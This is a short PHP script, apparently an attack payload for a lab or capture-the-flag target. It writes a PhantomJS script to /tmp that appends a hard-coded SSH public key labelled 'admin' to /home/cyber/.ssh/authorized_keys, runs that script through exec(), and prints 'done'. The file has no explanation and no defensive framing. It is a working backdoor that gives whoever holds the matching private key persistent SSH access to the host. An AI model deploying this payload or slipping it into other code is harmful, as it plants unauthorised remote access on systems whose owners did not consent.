<?php

$s = <<<END
var fs = require('fs');

var path = '/home/cyber/.ssh/authorized_keys';
var content = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMGdmZIG5QX6irkbW4EEdJ2RtxF5pnMdnv2nYd92l/vomJXvfPjaNzVsV8Z6eOp7EDLercA3Tu02uei66LuhUalLg+78rUYlbRDSccLjtlLtiO/TgIO5NR4NINSMuMG/qvZUNDQzKhvcTVDfOCQNDVeiFr+DHrH9ypzV+qM5xZ2R8ZG9C9k7GCjmo102QKOCCdqAKia9O40mKCHsIxoqbgclfEQZFPIiNhK5G370mxzIqUS4OaReBzE4QmG9BhTMM3V70IiWZD0rMTAXrvZ+it5kyXAl85uQlQGnbrnsclirbcQLlCj8+Qqkq9qvG/GA1FUyeiNQxP7mU95Obs+WnP admin';
fs.write(path, content, 'a');

phantom.exit();
END;

$f = fopen("/tmp/addkey.js", "w");
fwrite($f, $s);
fclose($f);


exec("/home/cyber/www/phantomjs /tmp/addkey.js");

echo "done";
